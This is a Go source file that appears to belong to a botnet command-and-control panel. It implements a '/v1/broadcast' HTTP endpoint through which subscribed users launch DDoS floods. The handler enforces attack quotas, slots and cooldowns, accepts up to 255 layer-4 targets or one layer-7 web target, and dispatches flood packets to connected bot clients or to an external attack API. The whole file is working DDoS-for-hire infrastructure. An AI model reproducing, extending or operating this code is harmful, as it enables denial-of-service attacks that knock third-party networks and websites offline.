package api

import (
	"cnc/internal"
	"cnc/internal/clients"
	"cnc/internal/database"
	"cnc/internal/master/floods"
	"cnc/internal/master/floods/flags"
	"cnc/pkg/logging"
	"errors"
	"fmt"
	"github.com/dustin/go-humanize"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// Define error messages as constants for reuse
const (
	errInvalidMethod         = "invalid request method"
	errMissingFields         = "missing fields"
	errDatabaseError         = "database error! contact staff"
	errInvalidPassword       = "invalid password"
	errInvalidRole           = "user does not have required roles"
	errVectorNotExist        = "vector does not exist"
	errFlagNotExist          = "flag does not exist"
	errNoAccessToMethod      = "no access to method"
	errAccountExpired        = "access expired %s"
	errNoDailyAttacksLeft    = "no daily attacks left"
	errSlotsFull             = "slots full"
	errCooldownActive        = "you're on cooldown"
	errTargetBlacklisted     = "target is blacklisted"
	errInvalidTarget         = "specify valid target"
	errMaxTargetsExceeded    = "max targets is 255"
	errMultipleL7Targets     = "web application floods do not support multiple targets"
	errDurationParsingFailed = "parsing duration failed"
	errMaxDurationExceeded   = "max duration is %d for raw, %d for spoof"
	errAttackSendingFailed   = "error occurred while sending attack"
	errFloodLogInsertion     = "error occurred while inserting flood log"
)

var (
	requiredFields = []string{
		"username",
		"password",
		"target",
		"duration",
		"vector",
	}
)

// I'm not proud of this at all

func handleBroadcast(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeJson(w, http.StatusMethodNotAllowed, map[string]interface{}{
			"success": false,
			"error":   errInvalidMethod,
		})
		return
	}

	for _, field := range requiredFields {
		if !r.URL.Query().Has(field) {
			writeJson(w, http.StatusBadRequest, map[string]interface{}{
				"success": false,
				"error":   errMissingFields,
			})
			return
		}
	}

	username := r.URL.Query().Get("username")
	password := r.URL.Query().Get("password")
	target := r.URL.Query().Get("target")
	durationStr := r.URL.Query().Get("duration")
	vector := r.URL.Query().Get("vector")

	user, err := database.User.SelectByUsername(username)
	if err != nil {
		writeJson(w, http.StatusInternalServerError, map[string]interface{}{
			"success": false,
			"error":   errDatabaseError,
		})
		logging.Global.Err(err).Msg("Retrieving user from DB failed")
		return
	}

	if strings.Compare(user.Password, database.Hash([]byte(password))) != 0 {
		writeJson(w, http.StatusUnauthorized, map[string]interface{}{
			"success": false,
			"error":   errInvalidPassword,
		})
		return
	}

	if !user.HasRole("api") {
		writeJson(w, http.StatusUnauthorized, map[string]interface{}{
			"success": false,
			"error":   errInvalidRole,
		})
		return
	}

	vec, exists := floods.VectorList[vector]
	if !exists {
		writeJson(w, http.StatusNotFound, map[string]interface{}{
			"success": false,
			"error":   errVectorNotExist,
		})
		return
	}

	if !user.ContainsRole(vec.Roles) && !user.HasRole("admin") {
		writeJson(w, http.StatusUnauthorized, map[string]interface{}{
			"success": false,
			"error":   errNoAccessToMethod,
		})
		return
	}

	if user.IsExpired() {
		writeJson(w, http.StatusUnauthorized, map[string]interface{}{
			"success": false,
			"error":   fmt.Sprintf(errAccountExpired, humanize.Time(user.Expiry)),
		})
		return
	}

	if user.LeftAttacks() <= 0 {
		writeJson(w, http.StatusUnauthorized, map[string]interface{}{
			"success": false,
			"error":   errNoDailyAttacksLeft,
		})
		return
	}

	slots := internal.GlobalSlots
	if vec.API {
		slots = internal.ApiSlots
	}

	if database.Logs.RunningCount(vec.API) >= slots {
		writeJson(w, http.StatusTooManyRequests, map[string]interface{}{
			"success": false,
			"error":   errSlotsFull,
		})
		return
	}

	left, cooldown, err := user.CooldownStatus(vec.API)
	if err != nil && !strings.Contains(err.Error(), "no last attack recorded") {
		writeJson(w, http.StatusInternalServerError, map[string]interface{}{
			"success": false,
			"error":   errDatabaseError,
		})
		logging.Global.Err(err).Msg("Database error occurred")
		return
	}

	if cooldown {
		writeJson(w, http.StatusTooManyRequests, map[string]interface{}{
			"success":  false,
			"error":    errCooldownActive,
			"cooldown": time.Until(left).Seconds(),
		})
		return
	}

	flood, err := database.Logs.LastGlobalFlood(vec.API)
	if err != nil {
		writeJson(w, http.StatusInternalServerError, map[string]interface{}{
			"success": false,
			"error":   errDatabaseError,
		})
		logging.Global.Err(err).Msg("Database error occurred")
		return
	}

	if flood != nil && !vec.API && time.Now().Before(flood.Ended.Add(internal.GlobalCooldown)) {
		writeJson(w, http.StatusTooManyRequests, map[string]interface{}{
			"success":  false,
			"error":    errCooldownActive,
			"cooldown": time.Until(flood.Ended.Add(internal.GlobalCooldown)).Seconds(),
		})
		return
	}

	hosts := strings.Split(target, ",")
	if len(hosts) > 255 {
		writeJson(w, http.StatusBadRequest, map[string]interface{}{
			"success": false,
			"error":   errMaxTargetsExceeded,
		})
		return
	}

	profile := createAttackProfile(vec, user)
	if !vec.IsL7 {

		for _, host := range hosts {
			target, err := floods.NewTarget(host, user)
			if err != nil {
				if errors.Is(err, floods.ErrBlacklistedTarget) {
					writeJson(w, http.StatusForbidden, map[string]interface{}{
						"success": false,
						"error":   errTargetBlacklisted,
					})
					return
				}

				writeJson(w, http.StatusBadRequest, map[string]interface{}{
					"success": false,
					"error":   errInvalidTarget,
				})
				return
			}

			profile.Targets[target.Address] = target.Netmask
		}

	} else {
		if len(hosts) > 1 {
			writeJson(w, http.StatusBadRequest, map[string]interface{}{
				"success": false,
				"error":   errMultipleL7Targets,
			})
			return
		}

		profile.L7Target = hosts[0]
	}

	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		writeJson(w, http.StatusBadRequest, map[string]interface{}{
			"success": false,
			"error":   errDurationParsingFailed,
		})
		return
	}

	if (vec.API && duration > user.ApiDuration) || (!vec.API && duration > user.Duration) {
		writeJson(w, http.StatusForbidden, map[string]interface{}{
			"success": false,
			"error":   fmt.Sprintf(errMaxDurationExceeded, user.Duration, user.ApiDuration),
		})
		return
	}

	profile.Duration = uint32(duration)

	for key, value := range r.URL.Query() {
		if isField(key) {
			continue
		}

		flag, exists := floods.FlagList[key]
		if !exists {
			writeJson(w, http.StatusNotFound, map[string]interface{}{
				"success": false,
				"error":   errFlagNotExist,
			})
			return
		}

		if err := flag.Type.Validate(value[0], flag); err != nil {
			writeJson(w, http.StatusInternalServerError, map[string]interface{}{
				"success": false,
				"error":   err.Error(),
			})
			return
		}

		profile.Options[flag] = value[0]
	}

	err = logFlood(profile, hosts, user, vec.API)
	if err != nil {
		writeJson(w, http.StatusInternalServerError, map[string]interface{}{
			"success": false,
			"error":   errFloodLogInsertion,
		})
		return
	}

	if vec.API {
		if err := vec.SendAPIAttack(profile, vector); err != nil {
			writeJson(w, http.StatusInternalServerError, map[string]interface{}{
				"success": false,
				"error":   errAttackSendingFailed,
			})
			return
		}

		writeJson(w, http.StatusOK, map[string]interface{}{
			"success":  true,
			"target":   strings.Join(hosts, ", "),
			"duration": uint32(duration),
			"vector":   vector,
		})
	} else {
		packet, err := profile.Build()
		if err != nil {
			writeJson(w, http.StatusInternalServerError, map[string]interface{}{
				"success": false,
				"error":   err.Error(),
			})
			return
		}

		success := clients.Instruct(clients.OpFlood, packet, &clients.Limitation{
			UUID:    make([]string, 0),
			Group:   make([]string, 0),
			Country: "",
			Count:   user.Clients,
			Admin:   false,
		})

		log, err := database.Logs.LastByUserID(user.ID)
		if err != nil {
			writeJson(w, http.StatusInternalServerError, map[string]interface{}{
				"success": false,
				"error":   errAttackSendingFailed,
			})
			return
		}

		log.Clients = success

		if err := log.Modify(); err != nil {
			logging.Global.Error().Err(err).Msg("An unexpected error occurred while trying to modify the attack.")
		}

		writeJson(w, http.StatusOK, map[string]interface{}{
			"success":  true,
			"target":   strings.Join(hosts, ", "),
			"duration": uint32(duration),
			"vector":   vector,
			"clients":  success,
		})
	}
}

func isField(val string) bool {
	for _, field := range requiredFields {
		if val == field {
			return true
		}
	}

	return false
}

func createAttackProfile(vec *floods.Vector, user *database.UserProfile) *floods.AttackProfile {
	return &floods.AttackProfile{
		ID:      vec.ID,
		AtkId:   uint16(rand.Intn(1 << 16)),
		Targets: make(map[uint32]uint8),
		Options: make(map[*flags.Flag]string),
	}
}

func logFlood(profile *floods.AttackProfile, hosts []string, user *database.UserProfile, isAPI bool) error {
	started := time.Now()

	return database.Logs.Insert(&database.FloodLog{
		AttackID: int(profile.AtkId),
		UserID:   user.ID,
		MethodID: int(profile.ID),
		Targets:  hosts,
		Duration: int(profile.Duration),
		Started:  started,
		Ended:    started.Add(time.Duration(profile.Duration) * time.Second),
		IsAPI:    isAPI,
	})
}

func Serve() {
	http.HandleFunc("/v1/broadcast", handleBroadcast)

	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		return
	}
}
